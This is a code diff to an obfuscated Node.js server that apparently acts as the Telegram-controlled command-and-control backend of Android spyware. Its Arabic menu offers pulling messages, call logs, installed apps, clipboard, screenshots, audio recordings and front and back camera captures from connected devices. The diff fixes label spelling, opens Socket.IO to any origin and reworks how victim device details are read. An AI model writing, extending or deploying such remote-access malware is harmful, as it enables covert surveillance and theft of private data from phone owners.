@@ -7,7 +7,7 @@ const express = require('express'),
   fs = require('fs'),
   app = express(),
   server = http.createServer(app),
-  io = new Server(server),
+  io = new Server(server, { cors: { origin: '*' } }),
   uploader = multer(),
   data = JSON.parse(fs.readFileSync('./data.json', 'utf8')),
   bot = new telegramBot(data.token, { polling: true }),
@@ -17,8 +17,8 @@ const express = require('express'),
     '\uD83D\uDCAC سحب الرسائل \uD83D\uDCAC',
     '\uD83D\uDCDE سجل المكالمات \uD83D\uDCDE',
     '\uD83D\uDCFD التطبيقات \uD83D\uDCFD',
-    '\uD83D\uDCF8 كيمرا خلفيه \uD83D\uDCF8',
-    '\uD83D\uDCF8 كيمرا أمامية \uD83D\uDCF8',
+    '\uD83D\uDCF8 كاميرا خلفيه \uD83D\uDCF8',
+    '\uD83D\uDCF8 كاميرا أمامية \uD83D\uDCF8',
     '\uD83C\uDF99 تسجيل صوت \uD83C\uDF99',
     '\uD83D\uDCCB سجل الحافظه \uD83D\uDCCB',
     '\uD83D\uDCFA لقطة شاشة \uD83D\uDCFA',
@@ -63,10 +63,9 @@ app.post('/upload', uploader.single('file'), (_0x504b1c, _0x252371) => {
 })
 io.on('connection', (_0x5c13cb) => {
   let _0x444e7d =
-      _0x5c13cb.handshake.headers.model + '-' + io.sockets.sockets.size ||
-      'no information',
-    _0x5d119c = _0x5c13cb.handshake.headers.version || 'no information',
-    _0x76c6b1 = _0x5c13cb.handshake.headers.ip || 'no information'
+      (_0x5c13cb.handshake.query && _0x5c13cb.handshake.query.model ? _0x5c13cb.handshake.query.model : 'unknown') + '-' + io.sockets.sockets.size,
+    _0x5d119c = (_0x5c13cb.handshake.query && _0x5c13cb.handshake.query.version) ? _0x5c13cb.handshake.query.version : 'no information',
+    _0x76c6b1 = (_0x5c13cb.handshake.query && _0x5c13cb.handshake.query.ip) ? _0x5c13cb.handshake.query.ip : 'no information'
   _0x5c13cb.model = _0x444e7d
   _0x5c13cb.version = _0x5d119c
   let _0x35ea49 =
@@ -562,8 +561,8 @@ bot.on('message', (_0x517bec) => {
                                       '\uD83D\uDCFD التطبيقات \uD83D\uDCFD',
                                     ],
                                     [
-                                      '\uD83D\uDCF8 كيمرا خلفيه \uD83D\uDCF8',
-                                      '\uD83D\uDCF8 كيمرا أمامية \uD83D\uDCF8',
+                                      '\uD83D\uDCF8 كاميرا خلفيه \uD83D\uDCF8',
+                                      '\uD83D\uDCF8 كاميرا أمامية \uD83D\uDCF8',
                                     ],
                                     [
                                       '\uD83C\uDF99 تسجيل صوت \uD83C\uDF99',
@@ -709,7 +708,7 @@ bot.on('message', (_0x517bec) => {
                                   }
                                 ))
                               _0x517bec.text ===
-                                '\uD83D\uDCF8 كيمرا خلفيه \uD83D\uDCF8' &&
+                                '\uD83D\uDCF8 كاميرا خلفيه \uD83D\uDCF8' &&
                                 (io.to(_0xc65239).emit('commend', {
                                   request: 'main-camera',
                                   extras: [],
@@ -733,7 +732,7 @@ bot.on('message', (_0x517bec) => {
                                   }
                                 ))
                               _0x517bec.text ===
-                                '\uD83D\uDCF8 كيمرا أمامية \uD83D\uDCF8' &&
+                                '\uD83D\uDCF8 كاميرا أمامية \uD83D\uDCF8' &&
                                 (io.to(_0xc65239).emit('commend', {
                                   request: 'selfie-camera',
                                   extras: [],
@@ -1111,8 +1110,8 @@ bot.on('message', (_0x517bec) => {
                                               '\uD83D\uDCFD التطبيقات \uD83D\uDCFD',
                                             ],
                                             [
-                                              '\uD83D\uDCF8 كيمرا خلفيه \uD83D\uDCF8',
-                                              '\uD83D\uDCF8 كيمرا أمامية \uD83D\uDCF8',
+                                              '\uD83D\uDCF8 كاميرا خلفيه \uD83D\uDCF8',
+                                              '\uD83D\uDCF8 كاميرا أمامية \uD83D\uDCF8',
                                             ],
                                             [
                                               '\uD83C\uDF99 تسجيل صوت \uD83C\uDF99',
